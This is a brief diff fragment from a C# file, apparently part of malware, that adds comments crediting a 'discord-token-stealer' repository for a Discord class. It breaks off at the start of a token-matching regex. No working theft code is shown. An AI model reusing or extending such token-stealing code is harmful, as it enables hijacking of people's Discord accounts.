@@ -11,6 +11,8 @@ using System.Text.RegularExpressions;
 
 namespace Vollmond.messengers
 {
+    // This is modified code, from repository: https://github.com/Weakpawn/discord-token-stealer-csharp/tree/main
+    // Repository have an MIT Licencse!!!
     class discord
     {
         private static readonly Regex TokenRegex = new Regex(
